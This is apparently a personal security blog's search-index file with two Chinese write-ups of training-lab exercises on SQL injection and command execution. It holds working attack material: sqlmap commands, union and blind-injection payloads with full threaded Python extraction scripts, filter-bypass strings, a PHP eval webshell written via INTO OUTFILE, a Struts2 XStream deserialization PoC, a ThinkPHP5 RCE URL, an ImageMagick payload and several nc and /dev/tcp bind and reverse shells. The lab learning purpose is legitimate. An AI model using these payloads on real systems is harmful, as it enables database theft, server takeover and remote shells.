{"meta":{"title":"gwolfs的个人博客","subtitle":"","description":"","author":"gwolfs","url":"http://blog.ydq6.com","root":"/"},"pages":[{"title":"about","date":"2020-05-01T06:53:25.000Z","updated":"2020-05-01T06:53:25.212Z","comments":true,"path":"about/index.html","permalink":"http://blog.ydq6.com/about/index.html","excerpt":"","text":""},{"title":"categories","date":"2020-04-30T13:34:01.000Z","updated":"2020-04-30T13:35:12.193Z","comments":true,"path":"categories/index.html","permalink":"http://blog.ydq6.com/categories/index.html","excerpt":"","text":""},{"title":"tags","date":"2020-04-30T13:35:30.000Z","updated":"2020-04-30T13:35:56.646Z","comments":true,"path":"tags/index.html","permalink":"http://blog.ydq6.com/tags/index.html","excerpt":"","text":""},{"title":"schedule","date":"2020-05-01T11:57:57.000Z","updated":"2020-05-06T03:41:26.261Z","comments":true,"path":"schedule/index.html","permalink":"http://blog.ydq6.com/schedule/index.html","excerpt":"","text":"计划 此文档为记录当前正在做的工作。 2020年5月5日 SGX Tcounter项目 实验代码 web安全 逻辑漏洞总结"}],"posts":[{"title":"合天培训_实验_sql注入","slug":"合天培训_实验_sql注入","date":"2020-05-01T09:00:13.000Z","updated":"2020-05-01T12:53:46.701Z","comments":true,"path":"web/合天培训_实验_sql注入/","link":"","permalink":"http://blog.ydq6.com/web/%E5%90%88%E5%A4%A9%E5%9F%B9%E8%AE%AD_%E5%AE%9E%E9%AA%8C_sql%E6%B3%A8%E5%85%A5/","excerpt":"本文主要描述了SQL注入的几种类型，以及使用sqlmap如何对这几种类型进行注入。","text":"本文主要描述了SQL注入的几种类型，以及使用sqlmap如何对这几种类型进行注入。 1.数字型注入直接用sqlmap 12345678sqlmap -u http://47.105.75.177/vulnlab/sqli/index.php?id=1sqlmap -u http://47.105.75.177/vulnlab/sqli/index.php?id=1 –dbs #列数据库信息sqlmap -u http://47.105.75.177/vulnlab/sqli/index.php?id=1 --current-db 查看当前使用的数据库sqlmap -u http://47.105.75.177/vulnlab/sqli/index.php?id=1 -D hetianlab --tables #查看数据库下的表名sqlmap -u http://47.105.75.177/vulnlab/sqli/index.php?id=1 -D hetianlab -T user --columnssqlmap -u http://47.105.75.177/vulnlab/sqli/index.php?id=1 -D hetianlab -T user --columns --dump 手工注入： 1234567-1 union select 1,2,3-1 union select 1,2,database()-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()-1%20union%20select%201,2,group_concat(column_name)%20from%20information_schema.columns%20where%20table_schema=database()%20and%20table_name=%27user%27-1%20union%20select%201,username,password%20from%20user 得到账户名：admin 密码： 21232f297a57a5a743894a0e4a801fc3 2.字符型注入12' 报错'%23 正确 猜测为字符型注入。 爆库 1234567-1' union select 1,2,3 %23-1' union select 1,2,database() %23-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() %23-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() %23-1'%20union%20select%201,2,group_concat(column_name)%20from%20information_schema.columns%20where%20table_schema=database()%20and%20table_name=%27user%27 %23-1'%20union%20select%201,username,password%20from%20user %23 得到账户名：admin 密码： 21232f297a57a5a743894a0e4a801fc3 3.布尔盲注（1）判断类型 121' 不显示结果1%27%23 正确 you are in 根据方法判断是盲注 根据http response看出是布尔型 （2）列数 11' order by 5 % 23 二分爆出列数3 （3）脚本爆表： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127#-*- coding:utf-8 -*-import requestsimport stringurl=\"http://47.105.75.177/vulnlab/sqli/index2.php?id=1\"target_url=\"&#123;url&#125;' and &#123;payload&#125;%23\"string_set = string.printable+',_'#判断条件可以选择length,substr,regexp,left等函数value_statement='(select (select ascii(substr(&#123;column_name&#125;,&#123;index&#125;,1)) from &#123;table_name&#125; where &#123;where_statement&#125;) &#123;symbol&#125; &#123;ascii_number&#125;) 'length_statement='(select (select length(&#123;column_name&#125;) from &#123;table_name&#125; where &#123;where_statement&#125;) &#123;symbol&#125; &#123;number&#125;) 'MAX_LEN = 10000ASCII_MAX = 128TRUE_FLAG=\"You are in\"import threadingclass MyThread(threading.Thread): def __init__(self,begin,end,column_name,table_name,where_statement): threading.Thread.__init__(self) self.begin = begin self.end = end self.value = '' self.column_name = column_name self.table_name = table_name self.where_statement = where_statement def run(self): value = \"\" for cur_index in range(self.begin,self.end+1): begin = 0 end = ASCII_MAX while begin &lt;= end: mid = (begin+end)//2 payload=value_statement.format(column_name=self.column_name,index=cur_index,table_name=self.table_name,where_statement=self.where_statement,symbol='=',ascii_number=mid) if selectIsTrue(payload): begin = mid break payload=value_statement.format(column_name=self.column_name,index=cur_index,table_name=self.table_name,where_statement=self.where_statement,symbol='&gt;',ascii_number=mid) if selectIsTrue(payload): begin = mid + 1 else: end = mid - 1 value += chr(begin) #print(\"value:%s\"%value) self.value = value def get_result(self): return self.valuedef selectIsTrue(payload): #print(\"url:\"+target_url.format(url=url,payload=payload)) content = requests.get(target_url.format(url=url,payload=payload)).content.decode(\"utf-8\") if TRUE_FLAG in content: return True else: return Falsedef get_len(column_name,table_name,where_statement): begin=0 end=MAX_LEN while begin &lt;= end: mid = (begin+end)//2 payload=length_statement.format(column_name=column_name,table_name=table_name,where_statement=where_statement,symbol='=',number=mid) if selectIsTrue(payload): begin = mid break payload=length_statement.format(column_name=column_name,table_name=table_name,where_statement=where_statement,symbol='&gt;',number=mid) if selectIsTrue(payload): begin = mid + 1 else: end = mid - 1 length = begin return lengthThread_Nums=10def get_value(column_name,table_name,where_statement,length): value = '' thread_lists = [] task_num = length//Thread_Nums if length &gt;= Thread_Nums: for i in range(1,length+1,task_num): cur_thread = MyThread(i,i+task_num-1,column_name,table_name,where_statement) thread_lists.append(cur_thread) cur_thread.start() else: cur_thread = MyThread(1,length,column_name,table_name,where_statement) thread_lists.append(cur_thread) cur_thread.start() for cur_thread in thread_lists: cur_thread.join() value += cur_thread.get_result() return valuedef main(): column_name=\"group_concat(table_name)\" table_name=\"information_schema.tables\" where_statement=\"table_schema=database()\" #判断表长度 all_table_name_len = get_len(column_name,table_name,where_statement) print(\"all_table_name_len:%s\"%all_table_name_len) #找表名 all_table_name = get_value(column_name,table_name,where_statement,all_table_name_len) print(\"all_table_name:%s\"%all_table_name) #comment,comments,emails,referers,string,user,user #判断列长度 column_name=\"group_concat(column_name)\" table_name=\"information_schema.columns\" t_name = input(\"输入要查询的表名\\n\") where_statement=\"table_schema=database() and table_name='&#123;t_name&#125;'\".format(t_name=t_name) all_column_name_len = get_len(column_name,table_name,where_statement) print(\"all_column_name_len:%s\"%all_column_name_len) all_column_name = get_value(column_name,table_name,where_statement,all_column_name_len) print(\"all_column_name:%s\"%all_column_name) c_names = input(\"输入所有要查询的字段,以逗号分开\\n\").split(',') for c_name in c_names: column_name=\"group_concat(&#123;column_name&#125;)\".format(column_name=c_name) table_name=t_name where_statement = \"1\" all_value_len = get_len(column_name,table_name,where_statement) print(\"%s_length:%s\"%(c_name,all_value_len)) all_value = get_value(column_name,table_name,where_statement,all_value_len) print(\"%s_value:%s\"%(c_name,all_value))if __name__ == \"__main__\": main() username:admin password:21232f297a57a5a743894a0e4a801fc3 或者直接sqlmap 1234python sqlmap.py -u \"http://47.105.75.177/vulnlab/sqli/index2.php?id=1\" -technique B --dbspython sqlmap.py -u \"http://47.105.75.177/vulnlab/sqli/index2.php?id=1\" -technique B -D hetianlab --tablespython sqlmap.py -u \"http://47.105.75.177/vulnlab/sqli/index2.php?id=1\" -technique B -D hetianlab -T user --columnspython sqlmap.py -u \"http://47.105.75.177/vulnlab/sqli/index2.php?id=1\" -technique B -D hetianlab -T user --dump 4.时间盲注尝试 1id=1' and sleep(3) %23 //where 语句里面可以用sleep函数。 发现时间延长。 所以可以直接用脚本爆破： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127#-*- coding:utf-8 -*-import requestsimport stringurl=\"http://47.105.75.177/vulnlab/sqli/index3.php?id=1\"target_url=\"&#123;url&#125;' and &#123;payload&#125;%23\"string_set = string.printable+',_'#判断条件可以选择length,substr,regexp,left等函数Sleep_Function=\"sleep(3)\"value_statement='if ((select (select ascii(substr(&#123;column_name&#125;,&#123;index&#125;,1)) from &#123;table_name&#125; where &#123;where_statement&#125;) &#123;symbol&#125; &#123;ascii_number&#125;),'+Sleep_Function+\",1)\"length_statement='if ((select (select length(&#123;column_name&#125;) from &#123;table_name&#125; where &#123;where_statement&#125;) &#123;symbol&#125; &#123;number&#125;),' + Sleep_Function+',1)'MAX_LEN = 10000ASCII_MAX = 128import threadingclass MyThread(threading.Thread): def __init__(self,begin,end,column_name,table_name,where_statement): threading.Thread.__init__(self) self.begin = begin self.end = end self.value = '' self.column_name = column_name self.table_name = table_name self.where_statement = where_statement def run(self): value = \"\" for cur_index in range(self.begin,self.end+1): begin = 0 end = ASCII_MAX while begin &lt;= end: mid = (begin+end)//2 payload=value_statement.format(column_name=self.column_name,index=cur_index,table_name=self.table_name,where_statement=self.where_statement,symbol='=',ascii_number=mid) if selectIsTrue(payload): begin = mid break payload=value_statement.format(column_name=self.column_name,index=cur_index,table_name=self.table_name,where_statement=self.where_statement,symbol='&gt;',ascii_number=mid) if selectIsTrue(payload): begin = mid + 1 else: end = mid - 1 value += chr(begin) #print(\"value:%s\"%value) self.value = value def get_result(self): return self.valuedef selectIsTrue(payload): #print(\"url:\"+target_url.format(url=url,payload=payload)) try: content = requests.get(target_url.format(url=url,payload=payload),timeout=1).content except: return True return Falsedef get_len(column_name,table_name,where_statement): begin=0 end=MAX_LEN while begin &lt;= end: mid = (begin+end)//2 payload=length_statement.format(column_name=column_name,table_name=table_name,where_statement=where_statement,symbol='=',number=mid) if selectIsTrue(payload): begin = mid break payload=length_statement.format(column_name=column_name,table_name=table_name,where_statement=where_statement,symbol='&gt;',number=mid) if selectIsTrue(payload): begin = mid + 1 else: end = mid - 1 length = begin return lengthThread_Nums=10def get_value(column_name,table_name,where_statement,length): value = '' thread_lists = [] task_num = length//Thread_Nums if length &gt;= Thread_Nums: for i in range(1,length+1,task_num): cur_thread = MyThread(i,i+task_num-1,column_name,table_name,where_statement) thread_lists.append(cur_thread) cur_thread.start() else: cur_thread = MyThread(1,length,column_name,table_name,where_statement) thread_lists.append(cur_thread) cur_thread.start() for cur_thread in thread_lists: cur_thread.join() value += cur_thread.get_result() return valuedef main(): column_name=\"group_concat(table_name)\" table_name=\"information_schema.tables\" where_statement=\"table_schema=database()\" #判断表长度 all_table_name_len = get_len(column_name,table_name,where_statement) print(\"all_table_name_len:%s\"%all_table_name_len) #找表名 all_table_name = get_value(column_name,table_name,where_statement,all_table_name_len) print(\"all_table_name:%s\"%all_table_name) #comment,comments,emails,referers,string,user,user #判断列长度 column_name=\"group_concat(column_name)\" table_name=\"information_schema.columns\" t_name = input(\"输入要查询的表名\\n\") where_statement=\"table_schema=database() and table_name='&#123;t_name&#125;'\".format(t_name=t_name) all_column_name_len = get_len(column_name,table_name,where_statement) print(\"all_column_name_len:%s\"%all_column_name_len) all_column_name = get_value(column_name,table_name,where_statement,all_column_name_len) print(\"all_column_name:%s\"%all_column_name) c_names = input(\"输入所有要查询的字段,以逗号分开\\n\").split(',') for c_name in c_names: column_name=\"group_concat(&#123;column_name&#125;)\".format(column_name=c_name) table_name=t_name where_statement = \"1\" all_value_len = get_len(column_name,table_name,where_statement) print(\"%s_length:%s\"%(c_name,all_value_len)) all_value = get_value(column_name,table_name,where_statement,all_value_len) print(\"%s_value:%s\"%(c_name,all_value))if __name__ == \"__main__\": main() username:admin password:21232f297a57a5a743894a0e4a801fc3 或者直接sqlmap 1234python sqlmap.py -u \"http://47.105.75.177/vulnlab/sqli/index3.php?id=1\" -technique T --dbspython sqlmap.py -u \"http://47.105.75.177/vulnlab/sqli/index3.php?id=1\" -technique T -D hetianlab --tablespython sqlmap.py -u \"http://47.105.75.177/vulnlab/sqli/index3.php?id=1\" -technique T -D hetianlab -T user --columnspython sqlmap.py -u \"http://47.105.75.177/vulnlab/sqli/index3.php?id=1\" -technique T -D hetianlab -T user --dump 宽字符注入输入单引号被斜杠转义，想方法把斜杠去掉，提示宽字符所以用gbk编码。第一个字节采用大于128的编码即可。 1id=1%9c%27 %23 成功绕过。直接查表 1id=-1%9c%27 union select 1,username,password from user %23 用户名： admin 密码： 21232f297a57a5a743894a0e4a801fc3 或者sqlmap: 1python sqlmap.py -u \"http://47.105.75.177/vulnlab/sqli/index3.php?id=1%9c%27\" -D hetianlab -T user --dump 绕过select过滤尝试union%20select%201,2,3,发现select 被过滤了。 尝试重写绕过union seselectlect 1,2,3成功。或者大小写绕过也成功union Select 1,2,3成功。 过滤语句应该是进行简单的替换。 1id = 1 union%20Select%201,username,password%20from%20user 账户名： admin ，密码： 21232f297a57a5a743894a0e4a801fc3 或者sqlmap: 1python sqlmap.py -u \"http://47.105.75.177/vulnlab/sqli/index5.php?id=1\" --tamper \"nonrecursivereplacement.py\" 进阶之真实案例随便浏览发现可能注入点： 1http://47.105.75.177/vulnlab/sqli/beecms/product/product.php?id=5 多番尝试后发现注不出来。 dirsearch扫描。 123456789101112131415161718192021222324252627282930313233python .\\dirsearch.py -u http://47.105.75.177/vulnlab/sqli/beecms -e php[12:34:56] 301 - 255B - /vulnlab/sqli/beecms/admin -&gt; http://47.105.75.177/vulnlab/sqli/beecms/admin/[12:34:57] 302 - 0B - /vulnlab/sqli/beecms/admin/ -&gt; login.php[12:34:57] 403 - 237B - /vulnlab/sqli/beecms/admin/.htaccess[12:34:57] 302 - 0B - /vulnlab/sqli/beecms/admin/?/login -&gt; login.php[12:34:57] 302 - 0B - /vulnlab/sqli/beecms/admin/admin.php -&gt; login.php[12:34:57] 302 - 0B - /vulnlab/sqli/beecms/admin/index.php -&gt; login.php[12:34:58] 200 - 2KB - /vulnlab/sqli/beecms/admin/login.php[12:34:58] 302 - 0B - /vulnlab/sqli/beecms/admin/upload.php -&gt; login.php[12:35:02] 301 - 257B - /vulnlab/sqli/beecms/article -&gt; http://47.105.75.177/vulnlab/sqli/beecms/article/[12:35:04] 301 - 254B - /vulnlab/sqli/beecms/book -&gt; http://47.105.75.177/vulnlab/sqli/beecms/book/[12:35:05] 301 - 258B - /vulnlab/sqli/beecms/ckeditor -&gt; http://47.105.75.177/vulnlab/sqli/beecms/ckeditor/[12:35:05] 200 - 0B - /vulnlab/sqli/beecms/ckeditor/[12:35:07] 301 - 254B - /vulnlab/sqli/beecms/data -&gt; http://47.105.75.177/vulnlab/sqli/beecms/data/[12:35:08] 301 - 254B - /vulnlab/sqli/beecms/down -&gt; http://47.105.75.177/vulnlab/sqli/beecms/down/[12:35:11] 301 - 258B - /vulnlab/sqli/beecms/includes -&gt; http://47.105.75.177/vulnlab/sqli/beecms/includes/[12:35:11] 200 - 0B - /vulnlab/sqli/beecms/includes/[12:35:11] 200 - 18KB - /vulnlab/sqli/beecms/index.php[12:35:12] 200 - 18KB - /vulnlab/sqli/beecms/index.php/login/[12:35:12] 301 - 257B - /vulnlab/sqli/beecms/install -&gt; http://47.105.75.177/vulnlab/sqli/beecms/install/[12:35:12] 200 - 89B - /vulnlab/sqli/beecms/install/[12:35:13] 301 - 259B - /vulnlab/sqli/beecms/languages -&gt; http://47.105.75.177/vulnlab/sqli/beecms/languages/[12:35:14] 301 - 256B - /vulnlab/sqli/beecms/member -&gt; http://47.105.75.177/vulnlab/sqli/beecms/member/[12:35:14] 200 - 0B - /vulnlab/sqli/beecms/member/[12:35:19] 301 - 257B - /vulnlab/sqli/beecms/product -&gt; http://47.105.75.177/vulnlab/sqli/beecms/product/[12:35:20] 200 - 140B - /vulnlab/sqli/beecms/robots.txt[12:35:20] 301 - 256B - /vulnlab/sqli/beecms/search -&gt; http://47.105.75.177/vulnlab/sqli/beecms/search/[12:35:21] 301 - 257B - /vulnlab/sqli/beecms/sitemap -&gt; http://47.105.75.177/vulnlab/sqli/beecms/sitemap/[12:35:23] 301 - 258B - /vulnlab/sqli/beecms/template -&gt; http://47.105.75.177/vulnlab/sqli/beecms/template/[12:35:23] 200 - 0B - /vulnlab/sqli/beecms/template/[12:35:24] 301 - 256B - /vulnlab/sqli/beecms/upload -&gt; http://47.105.75.177/vulnlab/sqli/beecms/upload/ 发现后台地址： 1http://47.105.75.177/vulnlab/sqli/beecms/admin/ 尝试sql注入: 12用户名：admin' or 1密码：123 报错: 12You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '' limit 0,1' at line 1sql:select id,admin_name,admin_password,admin_purview,is_disable from bees_admin where admin_name='admin' or 1' limit 0,1 现在直接构造payload注入： 12用户名：admin' and '1密码：123 提示不存在用户。尝试另外种思路： 12用户名：admi' union select 1,2,'pwd',4,5 #密码： pwd 报错： 1select id,admin_name,admin_password,admin_purview,is_disable from bees_admin where admin_name='admi' 1,2,'pwd',4,5 #' limit 0,1 发现union 和select被过滤了。 尝试绕过方法： 123（1）UnunionIon 显示UnunionIon（2）Union 显示空（2）Un union ion 显示union 成功绕过。 重新构造payload: 12用户名：admi' Un union ion Se select lect 1,2,'pwd',4,5 #密码： pwd 发现select函数有问题了， 尝试绕过方法： 1Se%select%lect 显示select 再构造payload: 12用户名：admi' Un union ion Se%select%lect 1,2,'pwd',4,5 #密码： pwd 说密码正确，猜想密码是密文保存的。用md5。 12用户名：admi' Un union ion Se%select%lect 1,2,'9003d1df22eb4d3820015070385194c8',4,5 #密码：pwd 注入成功，提示该账号被锁定，无法登录。 发现字段is_disable被设置成5所以不能登录，改下payload: 12用户名：admi' Un union ion Se%select%lect 1,'admin','9003d1df22eb4d3820015070385194c8',4,0 #密码：pwd 成功登录。 尝试文件注入： 首先绕过Into，outfile关键词，用I into nto, O%outfile%utfile替换 1用户名： admi' Un union ion Se%select%lect 1,'&lt;?php @eval($_POST[x]);?&gt;',3,4,5 I into nto O%outfile%utfile 'shell.php' # test: 1admi' Un union ion Se%select%lect 1,'&lt;?php echo 1;?&gt;',3,4,5 I into nto O%outfile%utfile '../upload/shell1.php' # 报错: 1操作数据库失败Can't create/write to file '/var/lib/mysql/upload/shell1.php' 猜测路径：/var/www/html/vulnlab/sqli/beecms/upload/ 构造payload上传即可。 1admi' Un union ion Se%select%lect 1,'&lt;?php @eval($_POST[x]);?&gt;',3,4,5 I into nto O%outfile%utfile '/var/www/html/vulnlab/sqli/beecms/upload/shell.php' # 测试下： 1admi' Un union ion Se%select%lect 1,'&lt;?php echo 1?&gt;',3,4,5 I into nto O%outfile%utfile '/var/www/html/vulnlab/sqli/beecms/upload/1.php' # 发现内容为： 1&amp;lt;?php echo 1;?&amp;gt; 3 4 5 所有特殊字符被转义了。所以利用胖白老大讲的char函数。 利用hackbar生成 1CHAR(60, 63, 112, 104, 112, 32, 64, 101, 118, 97, 108, 40, 36, 95, 71, 69, 84, 91, 120, 93, 41, 59, 63, 62) 所以payload为 1admi' Un union ion Se%select%lect 1,CHAR(60, 63, 112, 104, 112, 32, 64, 101, 118, 97, 108, 40, 36, 95, 80, 79, 83, 84, 91, 120, 93, 41, 59, 63, 62),3,4,5 I into nto O%outfile%utfile '/var/www/html/vulnlab/sqli/beecms/upload/shell2.php' # 然后用菜刀连接即可。 注意点：一句话木马是用的POST不是GET","categories":[{"name":"web安全","slug":"web","permalink":"http://blog.ydq6.com/categories/web/"}],"tags":[{"name":"web","slug":"web","permalink":"http://blog.ydq6.com/tags/web/"},{"name":"sql","slug":"sql","permalink":"http://blog.ydq6.com/tags/sql/"}]},{"title":"合天培训_实验_命令执行","slug":"合天培训_实验_命令执行","date":"2020-05-01T08:53:17.000Z","updated":"2020-05-01T13:50:23.064Z","comments":true,"path":"web/合天培训_实验_命令执行/","link":"","permalink":"http://blog.ydq6.com/web/%E5%90%88%E5%A4%A9%E5%9F%B9%E8%AE%AD_%E5%AE%9E%E9%AA%8C_%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/","excerpt":"本文主要描述了：（1）一些软件出现的命令执行漏洞（包括dvwa,struts,thinkphp,ImageMagick)（2）可能出现命令执行漏洞的PHP代码执行函数分析。（3）能执行系统命令的系统命令执行函数分析","text":"本文主要描述了：（1）一些软件出现的命令执行漏洞（包括dvwa,struts,thinkphp,ImageMagick)（2）可能出现命令执行漏洞的PHP代码执行函数分析。（3）能执行系统命令的系统命令执行函数分析 1. 命令执行漏洞（1）实验介绍 实验链接： http://www.hetianlab.com/expc.do?ce=39594afc-5c80-4d51-8f99-7cb54e20b401 实验来源：合天网安实验室 实验目的： 通过实验理解命令实验漏洞的原理和利用方法。 （2）实验操作 1）该实验是DVWA命令执行漏洞实验，先打开10.1.1.174然后输入账号密码进去，查看安全等级发现是high，将其设置成low。然后开始命令执行测试。 2）正常业务。发现在命令执行处可以输入ip地址，然后可以得到ping ip后的结果。 尝试127.0.0.1 3）fuzz测试。可以进行命令执行fuzz测试，发现很多符号都没被过滤。所以可以尝试攻击。 4）构造payload 127.0.0.1 | net user 查看用户 127.0.0.1 | echo ““ &gt; 1.php 写php文件 127.0.0.1 | echo ““ &gt; shell.php 写shell 用菜刀连接 由于实验机里没有nc工具就不尝试反弹shell了。 5)medium难度操作 通过fuzz发现&amp;&amp;和;被过滤了。 127.0.0.1;dir 127.0.0.1 &amp;&amp; dir 但是因为过滤不全所以可以用其他符号可以绕过，比如low中用的| 如果非要用&amp;&amp;可以使用下面方式： 1127.0.0.1 &amp;;&amp; dir 所以medium存在问题是使用黑名单，且黑名单机制不全。 2. CVE-2017-9805Struts2-052漏洞实验（1）实验介绍 实验链接： http://www.hetianlab.com/expc.do?ce=c9b7ee13-33d3-4317-b31c-c9a80a8ad0a2 实验来源：合天网安实验室 实验目的： 了解S2-052 Struts2远程命令执行漏洞危害；掌握检测利用S2-052 Struts2远程命令执行漏洞技术 （2）实验操作 1）搭建实验环境。 tomcat开启。下载软件源代码，部署war文件。打开 http://127.0.0.1:8080/struts2-rest-showcase 网站进行测试，成功显示，环境搭建成功。然后配置burp进行抓包，注意tomcat默认端口为8080，所以burp可以改为8090端口。 2）正常业务 点击edit，随便输入内容提交，成功提交。 3）poc测试 发现报错500，rce成功。而且弹出了计算器。 4）漏洞分析 XStreamHandler这个类对http请求中content-type是application/xml的，调用XStream进行处理。而XStreamHandler中的toObject()方法未对传入的值进行任何限制，导致XStream反序列化转化为对象时任意代码执行。 5）poc分析 poc: 123456&lt;map&gt;&lt;entry&gt;&lt;jdk.nashorn.internal.objects.NativeString&gt; &lt;flags&gt;0&lt;/flags&gt; &lt;value class=\"com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data\"&gt; &lt;dataHandler&gt; &lt;dataSource class=\"com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource\"&gt; &lt;is class=\"javax.crypto.CipherInputStream\"&gt; &lt;cipher class=\"javax.crypto.NullCipher\"&gt; &lt;initialized&gt;false&lt;/initialized&gt; &lt;opmode&gt;0&lt;/opmode&gt; &lt;serviceIterator class=\"javax.imageio.spi.FilterIterator\"&gt; &lt;iter class=\"javax.imageio.spi.FilterIterator\"&gt; &lt;iter class=\"java.util.Collections$EmptyIterator\"/&gt; &lt;next class=\"java.lang.ProcessBuilder\"&gt; &lt;command&gt; &lt;string&gt;cacl&lt;/string&gt; &lt;/command&gt; &lt;redirectErrorStream&gt;false&lt;/redirectErrorStream&gt; &lt;/next&gt; &lt;/iter&gt; &lt;filter class=\"javax.imageio.ImageIO$ContainsFilter\"&gt; &lt;method&gt; &lt;class&gt;java.lang.ProcessBuilder&lt;/class&gt; &lt;name&gt;start&lt;/name&gt; &lt;parameter-types/&gt; &lt;/method&gt; &lt;name&gt;foo&lt;/name&gt; &lt;/filter&gt; &lt;next class=\"string\"&gt;foo&lt;/next&gt; &lt;/serviceIterator&gt; &lt;lock/&gt; &lt;/cipher&gt; &lt;input class=\"java.lang.ProcessBuilder$NullInputStream\"/&gt; &lt;ibuffer&gt;&lt;/ibuffer&gt; &lt;done&gt;false&lt;/done&gt; &lt;ostart&gt;0&lt;/ostart&gt; &lt;ofinish&gt;0&lt;/ofinish&gt; &lt;closed&gt;false&lt;/closed&gt; &lt;/is&gt; &lt;consumed&gt;false&lt;/consumed&gt; &lt;/dataSource&gt; &lt;transferFlavors/&gt; &lt;/dataHandler&gt; &lt;dataLen&gt;0&lt;/dataLen&gt; &lt;/value&gt; &lt;/jdk.nashorn.internal.objects.NativeString&gt; &lt;jdk.nashorn.internal.objects.NativeString reference=\"../jdk.nashorn.internal.objects.NativeString\"/&gt; &lt;/entry&gt; &lt;entry&gt; &lt;jdk.nashorn.internal.objects.NativeString reference=\"../../entry/jdk.nashorn.internal.objects.NativeString\"/&gt; &lt;jdk.nashorn.internal.objects.NativeString reference=\"../../entry/jdk.nashorn.internal.objects.NativeString\"/&gt;&lt;/entry&gt;&lt;/map&gt; poc看不懂，分析是传入xml文件，估计下面语句 1&lt;command&gt;&lt;string&gt;C:\\Windows\\System32\\calc.exe&lt;/string&gt;&lt;/command&gt; 被当作命令执行。 3. Thinkphp5 远程命令执行漏洞（1）实验介绍 实验链接： http://www.hetianlab.com/expc.do?ce=78d1b399-298f-420a-9445-97774c98369f 实验来源：合天网安实验室 实验目的： 通过该实验了解ThinkPHP5远程命令执行漏洞的原因和利用方法，以及如何修复该漏洞。 （2）实验操作 1）安装环境。 利用netstat -tunlp检测是否开启AMP。注意php端口为9000。 下载ThinkPhp源码，并部署到apache的web目录下。换机器测试发现成功安装。 2）实验操作 直接利用实验里带的ThinkPHP5漏洞检测工具。 发现poc。 1index.php?s=/index/\\think\\request\\cache&amp;key=1|phpinfo 测试 发现正确。然后getshell. 3）漏洞分析 a. $this-&gt;config-&gt;get(‘var_pathinfo’)是配置文件的默认值，初始化值为s 。而pathinfo来自$_GET[$this-&gt;config-&gt;get(&#39;var_pathinfo&#39;)]，所以可以通过控制输入的参数s来控制pathinfo. b. 特定条件下，path变量等于pathinfo控制。而path又被传入了router-&gt;check()函数，然后交给url解析。 c.解析url时，Url模块把url解析为三部分。模块/控制器/操作。而模块，控制器，操作都是可控的。 问题出在对控制器的处理中，如果发现控制器以反斜杠开始时，直接将其作为类名赋值给$class并返回，最后会实例化这个类。 e.Module.php中用param获取实例化类对应的参数，然后通过invokeMethod函数动态调用方法。 4）poc poc不懂。。。 4. ImageMagick漏洞（1）实验介绍 实验链接： http://www.hetianlab.com/expc.do?ce=78d1b399-298f-420a-9445-97774c98369f 实验来源：合天网安实验室 实验目的：掌握ImageMagick命令执行漏洞产生的原因、利用方法以及修复方法 （2）实验操作 1）检查ImageMagick版本 版本号为6.8.9. 2）漏洞测试 创建exploit.png,其内容为： 1234push graphic-contextviewbox 0 0 640 480fill 'url(https://example.com/image.jpg\"|ls \"-la)'pop graphic-context 利用convert生成新文件： 1convert exploit.png out.png 可以发现成功执行了ls -a命令。证明存在命令执行漏洞。 3）漏洞利用 在另外台机器上，输入10.1.1.9访问目标服务器。先上传一个正常文件。 发现是用的ImageMagick工具转换的。 先下载 nc，并在本地开启监听。 1nc.exe -nvlp 12301 上传一个可以弹shell的图片。图片内容： 1234push graphic-contextviewbox 0 0 640 480fill 'url(https://example.com/image.jpg\"|bash -i &gt;&amp; /dev/tcp/10.1.1.2/12301 0&gt;&amp;1\")'pop graphic-context 上传后shell反弹成功。 4）漏洞分析 ImageMagick对于每种格式文件都指定了一种委托，对于https形式的文件处理方式为： 1\"wget\" -q -O \"%o\" \"https:%M\" 而%M为输入的图片的url地址。由于是简单的字符串拼接，所以可以将引号闭合后通过管道符引入其他命令，形成了命令注入。 5.web安全之命令执行漏洞理解A.rce_ping（1）正常业务 1127.0.0.1 有回显。 （2）fuzz测试。 首先抓包 发现有两个参数，一个参数一个命令。可以猜想可能使用了一些命令执行函数。比如 123exec($_POST['submit'].\" \".$_POST['ipaddress'],$return);echo $return;echo system($_POST['submit'].\" \".$_POST['ipaddress']);echo shell_exec($_POST['submit'].\" \".$_POST['ipaddress']); 为了方便我们只对ipaddress这一选项进行fuzz测试。发现没有过滤。 （3）由于没有任何过滤所以直接写shell。 1ipaddress=127.0.0.1 | echo \"&lt;?php @eval($_POST['cmd']); ?&gt;\" &gt; shell.php &amp; submit=ping 尝试连接： 发现失败，估计没有写的权限。 （4）尝试shell a.正向shell 服务器 1ipaddress=127.0.0.1 | nc -lvp 7777 -e /bin/bash 本机 1nc 47.105.75.177 7777 正向shell成功。 b.反弹shell 本机(自己的服务器)： 1nc -lk 7777 远程服务器 1ipaddress=127.0.0.1 | bash -i &gt;&amp; /dev/tcp/xxxx/7777 0&gt;&amp;1 发现反弹不成功。 换台服务器尝试 1ipaddress=127.0.0.1 | bash -i &gt;&amp; /dev/tcp/xxx/7777 0&gt;&amp;1 反弹shell成功。 B.rce_ping_2直接fuzz测试。 发现; &amp;&amp;被过滤了。 直接正向shell测试。 服务器 1ipaddress=127.0.0.1 | nc -lvp 7778 -e /bin/bash 本机 1nc 47.105.75.177 7778 c.rce_ping_3同样fuzz测试。 发现过滤了&amp; ;同第三关一样的测试即可。 D.rce_ping_4页面500 E.code规定三种能力。（1）列出目录（2）写shell (3)反弹shell a.array_filterarray_filter函数原型array_filter ( array $array [, callable $callback [, int $flag = 0 ]] ) （1）列出目录 1func=system&amp;cmd=ls 成功列举目录 （2）写shell 1func=system&amp;echo \"&lt;?php $_POST[pass]&gt; ?&gt;\" &gt; shell.php 发现还是不能上传shell???这里想探究下。 当前为apache用户，该文件夹为root创建，而others只有执行和读的权力。 (3)反弹shell。 1func=system&amp;cmd=nc -lvp 7781 -e /bin/bash 